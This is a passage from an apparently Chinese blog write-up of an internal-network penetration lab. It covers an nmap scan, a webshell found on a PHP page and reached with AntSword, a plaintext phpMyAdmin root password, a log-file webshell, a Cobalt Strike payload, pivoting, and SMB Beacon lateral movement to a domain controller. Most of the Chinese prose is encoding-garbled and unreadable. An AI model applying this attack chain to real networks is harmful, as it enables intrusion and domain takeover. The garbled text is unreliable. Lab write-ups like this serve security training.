110/tcp   open  pop3?
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql              MySQL (unauthorized)
3389/tcp  open  ssl/ms-wbt-server?
4444/tcp  open  krb524?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
</code></pre>

<p>80ç«¯å£ä¸‹æ˜¯ä¸ªApacheæœåŠ¡ï¼Œè¿›å…¥Web2ã€‚</p>

<h2 id="0x03-web2">0x03 Web2</h2>

<p>192.168.22.135çš„80ç«¯å£å¼€å¯äº†ApacheæœåŠ¡ï¼Œé€šè¿‡ä»£ç†è®¿é—®ï¼Œæ˜¯ä¸€ä¸ª <strong>æ¼”ç¤ºï¼šJ WTå®æˆ˜ï¼šä½¿ç”¨axios+PHP</strong> å®ç°ç™»å½•è®¤è¯é¡µé¢ï¼Œç”¨ç»™çš„demoè´¦å·ç™»å½•æ²¡æœ‰ååº”ï¼Œè¿™é‡Œé©¬å“¥å»çˆ†ç ´jwtå¯†é’¥äº†ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105853.png" alt="image-20220326141009298" /></p>

<p>ç»§ç»­ä¿¡æ¯æ”¶é›†ï¼Œæ‰«åˆ°ç›®å½•ä¸‹<code class="language-plaintext highlighter-rouge">a.php</code>ï¼Œå‰é¢æ˜¯ä¸€å †sqlæ—¥å¿—ä¿¡æ¯ï¼Œåé¢æ‰“å°äº†<code class="language-plaintext highlighter-rouge">phpinfo</code></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110009.png" alt="image-20220326162954201" /></p>

<p>å‘ç°<code class="language-plaintext highlighter-rouge">PHP_SESSION_UPLOAD_PROGRESS</code>æ˜¯å¼€å¯çš„ï¼Œé‚£ä¹ˆå¦‚æœå­˜åœ¨æ–‡ä»¶åŒ…å«æ˜¯å¯èƒ½å¯ä»¥ç›´æ¥LFI Getshell(è¯´æ˜¯æœ‰å¯èƒ½æ˜¯å› ä¸ºç”¨ä»£ç†æ‰“çš„è¯ï¼Œä¸å¤ªç¨³å®š)ã€‚</p>

<p>ä½†æ˜¯èµ°åˆ°<code class="language-plaintext highlighter-rouge">a.php</code>æœ€åï¼Œæˆ‘ç›´æ¥èšŒåŸ ä½äº†ï¼Œä»€ä¹ˆæ„æ€ï¼Ÿ</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105859.png" alt="image-20220326162254713" /></p>

<p>è¿™ä¸å°±æ˜¯å…¸å‹çš„ä¸€å¥è¯æœ¨é©¬æ²¡ä¼ å‚æ•°çš„æŠ¥é”™å˜›ï¼Œç»™èšå‰‘è®¾ä¸Šä»£ç†ï¼Œè¿æ¥è¯•è¯•</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105902.png" alt="image-20220326162618818" /></p>

<p>æˆåŠŸäº†ï¼Œæœ‰ç‚¹æ²¡å¼„æ‡‚ï¼Œé‚£jwté¡µé¢å²‚ä¸æ˜¯å®Œå…¨å”¬äººå˜›ï¼Œé©¬å“¥çš„çˆ†ç ´ä¹Ÿç™½å¼„äº†ï¼Œä¸è¿‡å¦‚æœæ˜¯çœŸå®ç¯å¢ƒä¸‹ï¼Œå€’æ˜¯ä¹Ÿéƒ½æœ‰å¯èƒ½ï¼Œå‰è¿›éƒ½æ˜¯åœ¨ä¸æ–­è¯•é”™çš„åŸºç¡€ä¸Šè¿ˆæ­¥ã€‚</p>

<p>èšå‰‘è¿ä¸Šå»ï¼Œå‘ç°<code class="language-plaintext highlighter-rouge">phpmyadmin</code>ï¼Œä»¥åŠå‡ ä¸ªæ–‡ä»¶çš„åˆ›å»ºæ—¶é—´ï¼Œç»“åˆä¹‹å‰<code class="language-plaintext highlighter-rouge">a.php</code>ä¸Šsqlæ—¥å¿—ä¿¡æ¯ï¼Œå¤§æ¦‚æ˜ç™½åº”è¯¥æ˜¯åˆ©ç”¨jwtçˆ†ç ´çš„å¯†é’¥ç™»å½•phpmyadminï¼Œå†åˆ©ç”¨æ—¥å¿—æ–‡ä»¶getshellã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105905.png" alt="image-20220326164915760" /></p>

<p>é©¬å“¥jwtä¹Ÿçˆ†ç ´å‡ºæ¥äº†</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110028.png" alt="image-20220326163351362" /></p>

<p>ç®€å•æµ‹è¯•äº†ä¸€ä¸‹ï¼Œç”¨root Qweasdzxc5 ç™»å½•phpmyadminæˆåŠŸ ï¼Œä¹‹åå°±æ˜¯å¾ˆç®€å•çš„æ—¥å¿—å†™é©¬ï¼Œå°±ä¸æ¼”ç¤ºäº†ã€‚</p>

<p>ä½†æ˜¯Web2å¹¶ä¸å‡ºç½‘ï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡Web1åšè·³æ¿æœºä»£ç†å‡ºæ¥ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105909.png" alt="image-20220326175722454" /></p>

<p>payloadç”Ÿæˆé€‰æ‹©<strong>Windows Excutable(s)</strong>ï¼Œå†ç”¨èšå‰‘ä¸Šä¼ ä¸Šå»ï¼Œæ‰§è¡Œæ‹¿åˆ°æƒé™ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105912.png" alt="image-20220326180431551" /></p>

<p>ä½†æ˜¯sessionæå…¶ä¸ç¨³å®šï¼Œå¹³å‡ä¸€åˆ†é’Ÿä¸€è·³ï¼Œå¾ˆéš¾å—ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110043.png" alt="image-20220326182548376" /></p>

<p>çœ‹ç½‘ä¸Šè¯´ç”¨ewåšè·³æ¿å·¥å…·ä¼šæ¯”csè‡ªå¸¦çš„è½¬å‘ç¨³å®šä¸€äº›ï¼Œä¸è¿‡åœ¨web1åŸºæœ¬ä¸Šä¸Šå»å°±è¢«æ€äº†ã€‚ä¹‹å‰Kconå…³æ³¨åˆ°<a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a>è¿™ä¸ªé¡¹ç›®è¿˜ä¸é”™ï¼Œæœ‰æœºä¼šå¯ä»¥å­¦ä¹ ä¸€ä¸‹ã€‚</p>

<h2 id="0x04-dcdata2">0x04 DC+data2</h2>

<p>å‘ç°Web2åœ¨åŸŸå†…ï¼Œçœ‹ä¸€ä¸‹åŸŸå†…æœºå™¨ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105916.png" alt="image-20220326195802401" /></p>

<p>å‡ºå»ä¸Šäº†ä¸ªè¯¾ï¼Œå›æ¥é©¬å“¥å·²ç»æ‹¿ä¸‹äº†åŸŸæ§(åˆ«éª‚äº†åˆ«éª‚äº†æœ‰æœºä¼šæˆ‘è¡¥ä¸Š)ï¼Œè¿™é‡Œæˆ‘æ¨ªå‘å»ºç«‹ SMB Beaconï¼ŒåŸŸå†…å°±å¯ä»¥æ‰¹é‡ä¸Šçº¿äº†ï½</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105919.png" alt="image-20220329003822748" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105922.png" alt="image-20220329004044722" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105926.png" alt="image-20220329003540577" /></p>

<p>æœ€åï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105930.png" alt="image-20220329003649048" /></p>

<p>æ€»ç»“</p>

<ol>
  <li>macæå…¶ä¸æ–¹ä¾¿ï¼Œå¾ˆå¤šå…æ€å·¥å…·éƒ½ä¾èµ–äºwinAPIï¼Œç›´æ¥Gã€‚</li>
  <li>åœ¨æœªçŸ¥çš„ç¯å¢ƒä¸‹ï¼Œéœ€è¦æ¸…æ¥šè‡ªå·±å½“å‰çš„ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Œä¸ç„¶å¾ˆå®¹æ˜“åœ¨æ— æ„ä¹‰çš„äº‹æƒ…ä¸Šæµªè´¹æ—¶é—´ã€‚</li>
  <li>æœ‰æœºä¼šå¯ä»¥å­¦å­¦å¤šçº§ä»£ç†ã€ç«¯å£å¤ç”¨ï¼Œè‡ªå·±å†™ç‚¹ä¸œè¥¿ã€‚</li>
  <li>å†…ç½‘è¿˜æŒºæœ‰æ„æ€ï¼Œè™½ç„¶æˆ‘åªæ˜¯Script Kidã€‚</li>
</ol>]]></content><author><name>Theoyu</name></author><summary type="html"><![CDATA[]]></summary></entry></feed>